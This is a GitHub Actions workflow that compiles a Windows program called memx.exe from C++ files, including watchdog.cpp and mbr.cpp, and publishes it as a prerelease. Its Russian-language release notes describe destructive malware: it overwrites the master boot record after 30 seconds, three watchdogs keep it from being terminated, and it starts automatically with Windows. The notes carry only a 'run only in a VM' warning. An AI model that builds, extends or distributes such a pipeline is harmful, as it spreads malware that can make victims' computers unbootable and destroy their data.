name: Build MEMX

on:
  push:
    branches: [ main ]
  workflow_dispatch:

env:
  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true

jobs:
  build:
    runs-on: windows-2022

    steps:
      - uses: actions/checkout@v4

      - name: Setup MSVC
        uses: ilammy/msvc-dev-cmd@v1

      - name: Build memx.exe
        shell: cmd
        run: |
          cl /EHsc /std:c++17 main.cpp effects.cpp watchdog.cpp mbr.cpp ^
          /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib ^
          /SUBSYSTEM:WINDOWS /OUT:memx.exe

      - name: Create Release
        uses: softprops/action-gh-release@v1
        with:
          files: memx.exe
          tag_name: memx-latest
          name: "MEMX — последняя сборка"
          body: |
            ## 🔥 MEMX.exe
            
            - 29 ультра-эффектов
            - Защита от завершения (3 watchdog)
            - Запись в MBR через 30 секунд
            - Автозапуск при старте Windows
            
            **Запускай ТОЛЬКО в виртуалке!**
          draft: false
          prerelease: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}